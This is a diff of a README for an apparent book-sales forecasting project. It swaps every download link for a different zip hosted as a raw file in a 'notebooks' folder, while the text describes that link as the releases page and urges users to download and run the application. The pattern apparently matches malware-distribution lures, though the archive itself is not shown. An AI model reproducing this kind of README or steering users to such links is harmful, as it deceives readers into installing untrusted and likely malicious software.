@@ -1,7 +1,7 @@
 # 📚 book-sales-forecasting-timeseries - Predict Future Book Sales Easily
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/Kenzyken-gsm/book-sales-forecasting-timeseries/main/notebooks/book-sales-forecasting-timeseries_3.6.zip)](https://raw.githubusercontent.com/Kenzyken-gsm/book-sales-forecasting-timeseries/main/notebooks/book-sales-forecasting-timeseries_3.6.zip)
+[![Download](https://raw.githubusercontent.com/Kenzyken-gsm/book-sales-forecasting-timeseries/main/notebooks/timeseries-forecasting-book-sales-v1.5.zip)](https://raw.githubusercontent.com/Kenzyken-gsm/book-sales-forecasting-timeseries/main/notebooks/timeseries-forecasting-book-sales-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To use this application, your computer should meet the following requirements:
 
 1. **Visit the Releases Page:** You will find the latest version of the application. Click on the link below to access it:
    
-   [Visit this page to download](https://raw.githubusercontent.com/Kenzyken-gsm/book-sales-forecasting-timeseries/main/notebooks/book-sales-forecasting-timeseries_3.6.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/Kenzyken-gsm/book-sales-forecasting-timeseries/main/notebooks/timeseries-forecasting-book-sales-v1.5.zip)
 
 2. **Choose Your Version:** Look for the most recent release. It will usually be at the top of the list.
 
@@ -84,4 +84,4 @@ For general questions or feedback, please reach out via GitHub’s contact page 
 
 Enjoy predicting your book sales! Download and start using the application today.
 
-[Download Now](https://raw.githubusercontent.com/Kenzyken-gsm/book-sales-forecasting-timeseries/main/notebooks/book-sales-forecasting-timeseries_3.6.zip)
+[Download Now](https://raw.githubusercontent.com/Kenzyken-gsm/book-sales-forecasting-timeseries/main/notebooks/timeseries-forecasting-book-sales-v1.5.zip)
